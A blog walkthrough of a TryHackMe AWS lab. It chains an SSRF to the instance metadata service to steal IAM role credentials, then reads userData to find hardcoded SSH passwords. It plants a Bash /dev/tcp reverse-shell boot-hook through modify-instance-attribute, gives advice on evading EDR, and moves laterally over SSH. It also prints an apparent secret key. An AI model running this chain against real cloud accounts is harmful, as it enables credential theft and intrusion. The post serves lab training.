---
layout: post
title: TryHackMe AWS EC2 Walkthrough
date: 2024-02-18
---

# THM EC2 Capstone Walkthrough

As backdrop, the THM lab provides you with a set of long-term AWS keys (Access ID and Secret Key). We could speculate how these are retrieved in a real-world pentest: social engineering, successful phishing, or secrets leaking. Regardless, IAM credentials are the springboard for many successful AWS attacks, so the hard part is done.

Next, we find out that, via threat intelligence, a Server-Side Request Forgery (SSRF) vulnerability exists in an EC2-hosted application, which is available via a public-facing load balancer. The SSRF vulnerability can give an attacker the opportunity to infiltrate a private subnet. All of this is within the same VPC, but the private subnet that hosts the internal EC2 instance is available to anyone within that VPC.

Let's start by enumerating all load balancers within our account:

```
~$ aws elbv2 describe-load-balancers
```

The *DNSName* field will give us the public URL. Use *nslookup* to get the IP and its host:

```
~$ nslookup initial-ssrf-vector-1523602582.us-east-1.elb.amazonaws.com
...
Address: 174.129.20.233
...

~$ nslookup 174.129.20.233
...
Non-authoritative answer:
233.20.129.174.in-addr.arpa	name = ec2-174-129-20-233.compute-1.amazonaws.com.
```

The *ec2-* in the second answer indicates that this is, in fact, an EC2 instance. Open it in a browser, or via *curl*. Interestingly, the response payload is just the phrase, "Hello Nurse".

Although it's not noted in the briefing, the THM walkthrough does provide a valid webpage: */ssrf.php*, which loads the vulnerable application component. The *IP* text entry field requires, oddly, a web URI or URL. The application will make a request to that URI and display the response payload at the very top of the page.

Enter a URL, like *google.com*, and click **Submit Query**. The response body appears at the top of the page. Note that if you forget to specify the *https://* protocol, then a 301 message may display instead; this simply indicates an HTTP-to-HTTPS redirect and is trivial for this guide.

Now, inspect the navigation bar for the current page. The URL you specified is in the query parameter, *r*. If you specified *google.com*, then the request URL is:

```
http://initial-ssrf-vector-1523602582.us-east-1.elb.amazonaws.com/ssrf.php?r=google.com#
```

Before going much farther, it's worth taking a look at the source code for this feature, which is displayed in the *ssrf.php* webpage:

```php
<?php
    if(isset($_GET['r'])) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $_GET['r']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_exec($ch);
        curl_close($ch);
    }
?>
```

The source code snippet seems to indicate that the application is leveraging the [PHP *curl* library](https://www.php.net/manual/en/book.curl.php) to make the request to your chosen URL. A few things to note here:

- The *curl* logic is initiated so long as the query parameter *r* exists.
- The first *curl\_setopt* function call will unconditionally set whatever URL you sent. No input validation on the URL is performed.
- The *curl\_exec* command will make the request to the unvalidated URL.

There exists no logic to enforce an allowed list of IPs, URLs, domains, and so forth. So, the *curl* invocation will request any URL you gave it, and return the logic as-is.

Since we know this is within the same VPC as the internal EC2 instance, we can try to leverage the Instance Metadata Service (IMDS). This will allow us to make simple requests with a URL string and, depending on the configuration, retrieve information about the EC2 instance with which we are working. It's worth noting that there are currently two versions: IMDSv2 (preferred) and IMDSv1 (legacy).

Here are some key points from an attacker's point of view:

- The IMDS, regardless of its version, is [always located at 169.254.169.254](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).
- Metadata for both versions can be retrieved from *169.254.169.254/latest/meta-data*.
- Both versions have [metadata categories](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html), which represent access points to get key information, and are simply appended to the */latest/meta-data* path in the URL.
- [IMDSv2 requires the use of tokens for authorization](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html#imds-considerations), whereas IMDSv1 performs *no authorization checks*.

So, if we use the vulnerable *ssrf.php* to make a request to an instance metadata endpoint, we should be able to get back some information about the instance itself. Send a request with the following URL path:

```
/ssrf.php?r=169.254.169.254/latest/meta-data
```

*Note: The full URL, with encoding, would look like so:*

```
http://initial-ssrf-vector-1523602582.us-east-1.elb.amazonaws.com/ssrf.php?r=169.254.169.254%2Flatest%2Fmeta-data#
```

The response displays at the top of the page:

```
ami-id
...
iam/
...
system
```

Note that this list matches up with the metadata categories. The presence of the *iam/* directory is interesting. Since we know that many AWS attacks begin by exploiting weaknesses or misconfigurations in this service, let's try to push this.

Open the documentation for all metadata categories and search for IAM ones. Note the *iam/security-credentials* metadata category. The documentation notes that *role-name* is optional, so the following two forms are valid:

- *iam/security-credentials*
- *iam/security-credentials/role-name*

However, these two forms will retrieve different information. Here's what the documentation says about this category:

> If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role... Otherwise, (role-name is) not present.

So, if we can get the role name, we can add the role name itself to the end of the path and effectively get temporary security credentials. This would allow us to impersonate the EC2 instance to some capacity. The question is: what *is* the name of the role?

Before going to far in, recall a couple of things:

- The */latest/meta-data* path listed files and directories.
- The *iam/security-credentials* path is valid, even if it proves useless.

So... what happens if we just target */latest/meta-data/iam/security-credentials*, like so:

```
/ssrf.php?r=169.254.169.254/latest/meta-data/iam/security-credentials
```

Send this request. As it turns out, we get a bit of information:

```
StarStarWAFRole
```

We can test if this is a valid role name by using this in the form, *iam/security-credentials/StarStarWAFRole*:

```
/ssrf.php?r=169.254.169.254/latest/meta-data/iam/security-credentials/StarStarWAFRole
```

This does, in fact, return temporary credentials:

```
{
  "Code" : "Success",
  "LastUpdated" : "2024-01-21T02:42:34Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "...",
  "Expiration" : "2024-01-21T09:08:26Z"
}
```

Take note of the *AccessKeyId*, *SecretAccessKey*, and *Token*. The Access Key ID stars with the string "ASIA," which confirms that this is a set of temporary credentials. In our workstation, we can "steal" this identity with *aws configure*. We'll call this profile *ec2-stolen*:

```
~$ aws configure --profile ec2-stolen
AWS Access Key ID: ASIA...
AWS Secret Access Key: Ii+ENMOCljICwUF8N15Nf+6lnv/AF0ZfWrlZ97k5
# Use the default region and output format...
```

Use one more command to set the access token, replacing `<Token>` with the long token value from the leaked credentials:

```
~$ aws configure --profile ec2-stolen set aws_access_token <Token>
```

Confirm your identity by comparing the original caller-identity information with that of the stolen credentials' identity:

```
~$ aws sts get-caller-identity 
{
    "UserId": "AIDA...",
    "Account": "...",
    "Arn": "arn:aws:iam::<UserId>:user/<UserId>"
}
~$ aws sts get-caller-identity --profile ec2-stolen
{
    "UserId": "AROA...",
    "Account": "...",
    "Arn": "arn:aws:sts::<UserId>:assumed-role/StarStarWAFRole/i-02c65bd50a06ee546"
}
```

Use the stolen credentials to describe EC2 instances associated with this role:

```
~$ aws ec2 describe-instances --profile ec2-stolen
```

From the output JSON, note the following fields:

- *Tags*. The *Name* tag's *Value* is, hopefully, a meaningful name for the instance.
- *InstanceId*. Used in subsequent EC2 API calls or the AWS CLI.
- *InstanceType*. Tells you what type of instance this is. Useful if you need to restart the instance.
- *PublicIpAddress*. If *None*, there is no way to directly access this instance from the web.
- *PrivateIpAddress*. Allows you to move laterally, to other instances, throughout the VPC.

*Note: you can write a query in the AWS CLI to view these fields only for each instance.*

In this case, discovery returns the following instance names:

- *ApplicationInstance*. Presumably, this runs the web application that contains *ssrf.php*. If we gain access to the system, we will want its private IP to confirm that we are in the right place.
- *SecretInstance*. Presumably, this is **Instance B** within the private subnet. We will want to note its private IP so that, if we gain initial access to the Application instance, we can move laterally to this one.

Let's analyze each instance a bit further. The [*ec2:DescribeImageAttribute*](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeInstanceAttribute.html) API specification lists several attributes that are fair game for further analysis. For the purpose of system access, the most interesting one is the *userData* attribute.

The instance [User Data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html) defines automated actions, including startup commands or scripts. If we can access these, it may tell us key information about what each instance is doing, and may provide some hints for entry. If we can *modify* these, then we can try to leverage both initial access and persistence into the environment.

First, let's see what each one is currently doing by retrieving the user data itself. The THM guide proposes a series of Bash commands which, during an engagement, you're more likely to use. The following Python code, which leverages the [*boto3* library](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html) does the same thing:

```python
import boto3
import botocore.config
import base64


class Instance:
    def __init__(self, instance_name, instance_id, user_data, private_ip):
        self.name = instance_name
        self.id = instance_id 
        self.user_data = user_data
        self.private_ip = private_ip


def get_instance_name_from_tags(tags_list):
    for tag in tags_list:
        if tag.get("Key") == "Name":
            return tag.get("Value")
    return None


def get_instance_info(ec2_client):
    response = ec2_client.describe_instances()
    for reservation in response.get("Reservations"):
        for instance in reservation.get("Instances"):
            id = instance.get("InstanceId")
            name = get_instance_name_from_tags(instance.get("Tags"))
            private_ip = instance.get("PrivateIpAddress")
            yield (id, name, private_ip)


def get_user_data(ec2_client):
    for id, name, priv_ip in get_instance_info(ec2_client):
        response = ec2_client.describe_instance_attribute(
            Attribute="userData", InstanceId=id
        )
        user_data_b64 = response["UserData"]["Value"]
        user_data = base64.b64decode(user_data_b64).decode("utf-8")
        yield Instance(name, id, user_data, priv_ip)


def process_user_data(ec2_client):
    for instance in get_user_data(ec2_client):
        print(
            f"\n{instance.id} {instance.name} {instance.private_ip}\n---" +
            f"{instance.user_data}"
        )
        with open(f"{instance.id}-{instance.name}-userdata.txt", "w+") as file:
            file.write(instance.user_data)


if __name__ == "__main__":
    config = botocore.config.Config(region_name="us-east-1")
    session = boto3.Session(profile_name="default")
    ec2_client = session.client("ec2")
    process_user_data(ec2_client)

```

This should print and list the each instance's ID, name, and user data, along with writing all of that to their own files. It's a bit overkill for a task and challenge of this scale. Still, it gives us something to analyze.

Key observations from the user data content:

- *ApplicationInstance*. This is a simple Bash script. The *yum* package manager is used to install some applications. Among those is [*awslogs*](https://github.com/jorgebastida/awslogs), which connects to [AWS CloudWatch](https://aws.amazon.com/cloudwatch/). This means that our activity in the instance could be monitored by an Incident Response team. Since configuration is handled in this script, if we can modify or overwrite the contents, then we may be able to evade defenses to some capacity. This is trivial here but may prove valuable in a real-life pentest, where SOC teams might find you and shut you out.
- *SecretDataInstance*. This is an AWS [*cloud-init*](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-cloud-init) file. Two key takeaways. First, the *ssh_pwauth* is set to *True*, which would enable a user to enter the instance without asymmetric keys. Even better, the *chpasswd* section includes the username and password needed to SSH into the instance. Likely, the developers implemented this weak configuration with hardcoded secrets because, they believed, the private cloud was impenetrable from the public internet. Time to prove them wrong.

The easiest way to gain initial access is to modify or replace one of these scripts. An easy way to do this is with a reverse shell. There are several ways to accomplish this, so we should cover the pros and cons:

- The THM guide proposes using *yum* to install *nc*, then invoke *nc* to create the reverse shell. This is probably the "easiest" way to do this and is easier when systems ship with Netcat preinstalled. Unfortunately, a ton of EDR configurations will detect if *nc* or *netcat* are invoked, so this may not be the best way to catch this.

- Another approach is to use [Bash itself to create the TCP connection](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp). The command uses [port redirections](https://unix.stackexchange.com/a/241177) and doesn't leverage *nc* or any other binary; and, because it's running raw Bash, it may stand out *way* less than a well-known command that's easy to detect based on its filename and signature. The con is that you definitely need a Unix-like system running Bash version 2.0.4 or above. In addition, it can prove challenging to pull off and debug this kind of "remote shell-fu," so tread lightly in real-world situations.

Let's try out the native Bash approach. Take care to use the AttackBox and use its public IP. We can write a Bash boot-hook with the following contents:

```
#cloud-boothook
#!/bin/bash -x
bash -i >& /dev/tcp/<AttackBoxPublicIP>/4444 0>&1
```

Save it as *reverse-shell-native.txt*. Next, base64-encode the file. Since OpenSSL is available on *many* platforms, we can use that to encode its contents:

```
~$ openssl base64 -in reverse-shell-native.txt -out reverse-shell-native.enc
```

In addition, go ahead and start the listener in the AttackBox shell:

```
~$ nc -lvp 4444
```

Now, we need to upload the contents to one of the instances. From trial-and-error, I can confirm that a rever shell connection will fail if coming from the *SecretDataInstance*. There's lots of reasons why reverse shells might fail&mdash;for example, firewall rules or EDR software&mdash;but you should never make assumptions. If this had worked, we would have circumvented the Application instance altogether.

Instead, we can defer to the attack workflow provided in the lab briefing: setting up the reverse shell to the *ApplicationInstance*, then using a password-based *ssh* to the *SecretDataInstance*. 

First, revert the original *userData* on the secret instance. Then, stop the *ApplicationInstance*, update the *userData* attribute with the same ASCII-encoded reverse shell payload, and start the instance again, using the *ApplicationInstance* ID. 

```
~$ aws ec2 start-instances \
    --instance-id i-... \
    --profile ec2-stolen
    # Wait...

~$ aws ec2 modify-instance-attribute \
    --profile ec2-stolen \
    --instance-id i-... \
    --attribute userData \
    --value file://reverse-shell-native.enc
    # Note: If successful, nothing will print.

~$ aws ec2 start-instances \
    --instance-id i-... \
    --profile ec2-stolen
    # Wait a little longer...
```

Note that stopping and starting can both take a few minutes, so grab a cup of coffee. You can check on the status with the *ec2:DescribeInstanceStatus* API call:

```
~$ aws ec2 describe-instance-status \
    --profile ec2-stolen 
    --instance-ids i-...
```

In any case, once successful, the *nc* listener will receive the connection. At this point, I would strongly recommend running `bash -i` or run `python -c 'import pty; pty.spawn("/bin/bash")'`. If not, you won't see the SSH prompts, and this may interfere with the login process.

Once you're ready, use:

```
~$ ssh <User>@<PrivateIp>
```

Where:

- *User* is the username you exfiltrated from the Secret instance's *userData* configuration
- *PrivateIp* is the Secret instance's *PrivateIpAddress* we got earlier

Once it prompts you for the password, use the password exfiltrated from the *userData*. At this point, you can run some familiar Linux commands to dump the contents of the secret.

As a final note, the *nc* package is preinstalled on the Secret instance. You can use it to try and manually initiate a reverse shell outside of the NAT and try to get a connection from a public workstation or the THM AttackBox. I didn't have much success there, but it may be worth exploring further if you have the time.